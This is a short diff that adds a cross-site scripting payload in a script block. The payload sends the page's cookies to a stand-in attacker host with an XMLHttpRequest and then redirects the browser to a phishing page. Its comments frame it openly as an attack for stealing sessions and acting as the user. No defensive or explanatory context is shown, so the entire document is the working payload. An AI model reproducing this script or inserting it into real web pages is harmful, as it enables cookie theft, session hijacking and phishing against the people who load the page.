@@ -1,0 +1,9 @@
+<script>
+  // The attacker can use this script to steal the user's cookies
+  var xhr = new XMLHttpRequest();
+  xhr.open("GET", "http://attacker.com/steal.php?cookie=" + document.cookie, true);
+  xhr.send();
+  
+  // The attacker can also use this script to perform actions on behalf of the user
+  document.location = "http://attacker.com/phishing.html";
+</script>
